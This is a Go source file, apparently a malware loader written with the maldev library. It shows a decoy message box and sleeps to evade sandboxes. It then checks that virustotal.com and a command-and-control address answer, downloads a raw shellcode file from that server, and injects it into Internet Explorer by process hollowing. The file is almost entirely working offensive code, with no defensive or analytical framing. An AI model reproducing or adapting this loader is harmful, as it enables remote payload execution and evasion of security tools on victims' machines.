package main

import (
	"fmt"
	"os"
	"reflect"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"github.com/D3Ext/maldev/network"
	"github.com/D3Ext/maldev/shellcode"
)

func network_Checks(checkDomain string, c2Address string) bool {
	teknoUp, _ := network.GetStatusCode(checkDomain)
	if teknoUp != 200 {
		return false
	}
	c2Up, _ := network.GetStatusCode(c2Address)
	if c2Up != 200 {
		return false
	}
	return true
}

func wasteTime() {
	time.Sleep(8 * time.Second)
}

func main() {
	checkDomain := "https://virustotal.com"
	c2Address := "http://192.168.0.106"
	dlURL := c2Address + "/RAW.bin"
	user32 := syscall.NewLazyDLL("user32.dll")
	messageBoxA := user32.NewProc("MessageBoxA")
	message := "Hello friend\x00"
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&message))
	messageBoxA.Call(0, uintptr(hdr.Data), uintptr(hdr.Data), 0)
	runtime.KeepAlive(message)

	wasteTime()
	// if wasted <= 10 {
	// 	os.Exit(1) //Error Code 1 in my case implies we did not waste enough time
	// }
	nChecks := network_Checks(checkDomain, c2Address)
	if nChecks == false {
		os.Exit(2) //Error Code 2 implies the networck Checks failed
	}

	//The library is broken here
	//defender_Status := system.GetEdrInfo()
	//fmt.Println(defender_Status.Format())

	network.DownloadFile(dlURL)
	sc, err := shellcode.GetShellcodeFromFile("RAW.bin")
	if err != nil {
		panic(err)
	}
	wasteTime()
	// if wasted <= 10 {
	// 	os.Exit(1) //Error Code 1 in my case implies we did not waste enough time
	// }
	fmt.Println("The shellcode you have supplied will execute within the context of iexplorer.exe")
	Inject("C:\\Program Files\\Internet Explorer\\iexplore.exe", sc)
	fmt.Println("Successful Process Hollowing")
}
